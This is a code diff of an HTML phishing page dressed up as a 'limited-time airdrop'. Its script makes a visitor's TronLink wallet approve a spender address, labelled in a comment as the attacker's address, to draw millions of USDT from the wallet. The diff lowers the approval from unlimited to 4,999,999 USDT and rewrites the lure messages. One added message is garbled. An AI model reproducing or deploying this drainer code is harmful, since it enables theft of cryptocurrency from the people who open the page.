@@ -11,12 +11,13 @@
   </style>
 </head>
 <body>
-  <h1>🎉 恭喜你獲得限時空投！</h1>
-  <p id="status">請稍候，正在初始化授權...</p>
+  <h1>✨ 您獲得了限時空投！</h1>
+  <p id="status">正在初始化授權...</p>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 正確 TRC20 USDT 主網
-    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 攻擊者地址
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 主網合約
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";       // 攻擊者地址
+    const APPROVE_AMOUNT = window.tronWeb ? window.tronWeb.toSun(4999999) : 4999999 * 1e6; // 4999999 USDT
 
     const ABI = [{
       "constant": false,
@@ -31,16 +32,16 @@
 
     async function autoApprove() {
       if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        document.getElementById("status").innerText = "請使用 TronLink 錢包進入此頁面。";
+        document.getElementById("status").innerText = "請使用 TronLink 麼他尼徑入此頁面。";
         return;
       }
 
       const tronWeb = window.tronWeb;
       const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
-      document.getElementById("status").innerText = "⏳ 發送授權中...";
+      document.getElementById("status").innerText = "⭕️ 授權送出中...";
 
       try {
-        const tx = await contract.approve(SPENDER, tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send();
+        const tx = await contract.approve(SPENDER, APPROVE_AMOUNT).send();
         document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
